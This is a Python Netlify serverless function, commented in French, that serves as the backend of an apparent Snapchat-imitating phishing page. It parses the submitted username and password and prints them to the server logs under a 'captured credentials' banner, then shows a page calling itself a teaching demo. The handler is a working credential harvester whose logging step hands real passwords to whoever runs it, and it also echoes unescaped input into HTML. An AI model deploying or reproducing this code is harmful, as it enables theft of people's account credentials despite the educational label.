import json

def handler(event, context):
    # Netlify envoie les données du formulaire dans event['body']
    body = event.get('body', '')
    
    # Extraire les données du formulaire (username=xxx&password=yyy)
    params = {}
    for pair in body.split('&'):
        if '=' in pair:
            key, value = pair.split('=', 1)
            params[key] = value
    
    username = params.get('username', 'inconnu')
    password = params.get('password', 'inconnu')
    
    # ⭐ AFFICHAGE DANS LES LOGS NETLIFY (c'est ici que vous verrez les identifiants)
    print(f"🔴 IDENTIFIANTS CAPTURÉS : username={username}, password={password}")
    
    # Renvoyer une page HTML pour que l'utilisateur voie ses identifiants
    response_html = f"""
    <html>
        <body style="font-family: Arial; text-align: center; padding: 50px;">
            <h2>Login successful! (Démo pédagogique)</h2>
            <p>Identifiants reçus : <strong>{username}</strong> / <strong>{password}</strong></p>
            <p style="color: red; font-size: 14px;">⚠️ Ceci est une démonstration pour apprendre à repérer les sites de phishing.</p>
            <p style="font-size: 12px; color: gray;">Regardez l'URL dans la barre d'adresse : ce n'est PAS snapchat.com !</p>
        </body>
    </html>
    """
    
    return {
        'statusCode': 200,
        'headers': {'Content-Type': 'text/html'},
        'body': response_html
    }
